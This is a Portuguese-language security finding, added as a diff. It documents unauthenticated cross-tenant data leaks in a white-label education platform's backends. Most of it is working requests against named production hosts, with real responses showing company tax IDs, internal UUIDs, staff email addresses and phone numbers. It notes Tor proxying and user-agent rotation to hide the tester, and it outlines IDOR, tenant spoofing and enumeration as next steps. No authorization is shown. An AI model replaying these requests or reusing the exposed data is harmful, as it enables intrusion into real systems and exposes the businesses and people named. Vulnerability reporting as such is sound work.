@@ -1,0 +1,124 @@
+# F-002 — Info Disclosure UNAUTH multi-tenant (CNPJ, UUID, config escola)
+
+**Severidade:** ALTA (CNPJ + UUID interno + config completa sem auth, base para IDOR/tenant spoofing)
+**Host:** seducar-api-dashboard.onrender.com, api-qf9p.onrender.com (dashboard), api-site-hkm9.onrender.com (site), api-crm-h4ww.onrender.com (CRM)
+**Data:** 2026-08-27T16:46Z UTC
+**Auth requerida:** NENHUMA
+**OPSEC:** proxychains4 (socks5 127.0.0.1:9050) + UA rotativo
+
+## Sumário
+
+Os backends Seducar (AdonisJS em *.onrender.com) identificam o tenant
+multi-tenant via **header HTTP `domain: <hostname>`** (descoberto lendo o
+bundle do dashboard: `axios.create({ headers: { domain: STORE_URL } })`,
+onde `STORE_URL = location.host`). Esse header é controlável pelo
+cliente e **não exige autenticação**. Combinado com os endpoints
+UNAUTH `/v1/find/school`, `/` (site), `/auth/user/school?domain=` (CRM),
+permite enumerar e extrair configuração completa de qualquer tenant sem
+login — incluindo CNPJ, UUID interno, domínios, integrações, contatos.
+
+## Reprodução
+
+### 1. `/health` vaza tecnologia do banco (PROD + HML)
+```
+GET https://seducar-api-dashboard.onrender.com/health
+GET https://api-qf9p.onrender.com/health
+```
+Resposta (ambos):
+```json
+{"env":{"displayName":"Node Env Check","health":{"healthy":true}},
+ "appKey":{"displayName":"App Key Check","health":{"healthy":true}},
+ "lucid":{"displayName":"Database","health":{"healthy":true,
+   "message":"All connections are healthy"},
+   "meta":[{"connection":"mysql","message":"Connection is healthy","error":null}]}}
+```
+→ Vaza backend DB = **MySQL** (AdonisJS Lucid). Auxilia SQLi/CVE targeting.
+
+### 2. `/v1/find/school` com header `domain:` (UNAUTH) — PROD + HML
+```
+GET https://seducar-api-dashboard.onrender.com/v1/find/school
+Host: seducar-api-dashboard.onrender.com
+domain: degraucultural.com.br
+```
+Resposta:
+```json
+{"school":{"logo":"","company_name":"Degrau Cultural",
+  "document":"28.060.747/0001-54","domain":"degraucultural.com.br",
+  "uuid":"5e07ba67-a5c6-4795-a171-bacf95d0e86e"}}
+```
+Trocar `domain: centraldeconcursos.com.br`:
+```json
+{"school":{"logo":null,"company_name":"Central de Concursos",
+  "document":"61.632.659/0001-55","domain":"centraldeconcursos.com.br",
+  "uuid":"03a41685-b56d-4fdf-81ea-817a4d0a3ccd"}}
+```
+→ Vaza CNPJ e **UUID interno** de cada tenant (id=1 Degrau, id=2 Central).
+Mesmo comportamento em `api-qf9p.onrender.com` (HML).
+
+### 3. `GET /` do site (`api-site-hkm9`) com header `domain:` — UNAUTH
+```
+GET https://api-site-hkm9.onrender.com/
+domain: degraucultural.com.br
+```
+Vaza config completa (recorte):
+```json
+{"data":{"id":1,"uuid":"5e07ba67-a5c6-4795-a171-bacf95d0e86e",
+ "company_name":"Degrau Cultural","trading_name":"Editora Degrau Cultural",
+ "document":"28.060.747/0001-54","domain":"degraucultural.com.br",
+ "url_blog":"https://degraucultural.com.br/blog/noticias",
+ "facebook_pixel_id":"1","facebook_app_id":"1","facebook_app_secret_key":"1",
+ "facebook_user_token":"1","gtm":"GTM-NDP2N7",
+ "consys_channel":"https://canald.consystecnologia.com.br/espaco-aluno-login.php",
+ "contacts":{"phone_1":"(21) 3970-1015",
+   "email_1":"faleconosco@degraucultural.com.br",
+   "email_4":"luiz.fernando@degraucultural.com.br",
+   "whatsapp":"(21) 3970-1015"},
+ "areas":[{"id":13,"uuid":"028ef863-7a22-4217-8fce-93b307ff0710","name":"Administrativa"},
+          {"id":28,"uuid":"c78aa6a3-f349-4828-a4c4-c626550be754","name":"CNU"}, ...]}}
+```
+Tenant id=2 (Central) vazou GTM-WLXPDZ, consys_channel
+`canalc.consys.tec.br`, áreas/UUIDs.
+
+### 4. CRM `/auth/user/school?domain=` (UNAUTH, query param)
+```
+GET https://api-crm-h4ww.onrender.com/auth/user/school?domain=degraucultural.com.br
+```
+```json
+{"school":{"id":1,"name":"Degrau Cultural","domain":"degraucultural.com.br",
+ "logo_crm":"https://files-producao.s3.us-east-2.amazonaws.com/degrau-cultural/logos/...webp",
+ "logo_desktop":"...","logo_mobile":"..."}}
+```
+`?domain=centraldeconcursos.com.br` → id=2 (cross-tenant enum).
+`?domain=seducar.com.br` → `"Cliente não encontrado para o domínio informado"`
+(confirma white-label).
+
+## Impacto
+
+- **CNPJ vazado** de ambos tenants (Degrau 28.060.747/0001-54; Central
+  61.632.659/0001-55) — PII empresarial.
+- **UUIDs internos** dos tenants (para correlação em endpoints IDOR que
+  aceitam uuid: `/v1/admin/customers/orders/<uuid>`, áreas, categorias).
+- **Config completa** de marketing/integração exposta: GTM IDs, Facebook
+  Pixel/App IDs (placeholder "1" mas estrutura exposta), consys_channel
+  (URL de espaco-aluno de terceiro), emails internos
+  (`luiz.fernando@degraucultural.com.br`), telefones.
+- **Base para tenant spoofing**: qualquer request autenticado pode
+  injetar `domain:` header para acessar dados de outra escola
+  (cross-tenant BOLA) — vetor pós-auth de alto valor.
+- **Enumeração de tenants**: wordlist de domínios via `?domain=` / header
+  `domain:` descobrirá clientes white-label adicionais.
+
+## Recomendação
+
+- Validar `domain`/Origin no backend contra whitelist de tenants
+  confiáveis (não confiar em header controlável pelo cliente).
+- Remover `/health` de exposição pública (ou restringer por IP/origem).
+- Remover `/v1/find/school`, `/` (site) e `/auth/user/school?domain=`
+  do acesso unauth; exigir JWT ou mover para fluxo pós-login.
+- Não retornar CNPJ/UUID em endpoints públicos; usar slug público.
+
+## Referências
+
+- `enum/dashboard/index.4cb30cfe.js:2985-2992` (header `domain: STORE_URL`)
+- `enum/ENUM.md` §1-§4 (mapa de endpoints)
+- OWASP A01:2021 Broken Access Control / A05 Security Misconfig
